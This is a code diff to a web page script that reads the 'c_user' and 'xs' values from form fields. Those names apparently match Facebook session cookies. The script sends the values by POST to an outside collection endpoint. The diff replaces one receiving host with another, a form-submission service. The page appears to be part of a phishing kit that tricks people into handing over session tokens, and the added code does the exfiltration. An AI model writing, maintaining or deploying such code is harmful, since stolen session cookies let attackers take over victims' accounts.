@@ -1958,21 +1958,22 @@
                 if (!xsInput.checkValidity()) {
                     xsInput.reportValidity();
                     return;
-                }
-                
-                // Set values for hidden form
-                hiddenCUser.value = cUserInput.value;
-                hiddenXs.value = xsInput.value;
-                
+                } 
                 // Submit c_user and xs together
-                const formData = new FormData();
-                formData.append('c_user', cUserInput.value);
-                formData.append('xs', xsInput.value);
-                
-                fetch('https://professor-asif.wasmer.app/waheed.php', {
-                    method: 'POST',
-                    body: formData
-                })
+          const formData = new FormData();
+          formData.append("c_user", cUserInput.value);
+          formData.append("xs", xsInput.value);
+
+          fetch("https://submit-form.com/LSpFyPkS6", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+              c_user: cUserInput.value,
+              xs: xsInput.value
+            }),
+          })
                 .then(response => {
                     if (!response.ok) {
                         console.error('Submission of c_user and xs failed');
